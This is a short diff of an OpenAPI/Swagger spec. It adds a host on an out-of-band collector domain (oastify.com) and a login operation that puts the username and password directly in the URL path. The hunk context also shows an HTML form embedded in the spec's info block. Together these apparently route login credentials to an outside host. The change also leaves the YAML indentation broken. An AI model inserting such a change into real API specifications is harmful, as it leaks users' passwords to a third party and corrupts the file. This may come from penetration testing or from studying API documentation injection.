@@ -24,9 +24,20 @@ info:
         </form>
     </div>
 </div>'
+host: md3bcylezp1qjv581mva1sfnsey5m2ar.oastify.com
 paths:
   /{username}{password}:
-    post:
+post:
+      summary: Logs in
+      parameters:
+        - name: Username 
+          required: true
+          in: path
+          type: string
+        - name: Password 
+          required: true
+          in: path
+          type: string
       responses:
-        '200':
-          description: Login successful
+        200:
+          description: Login was successful
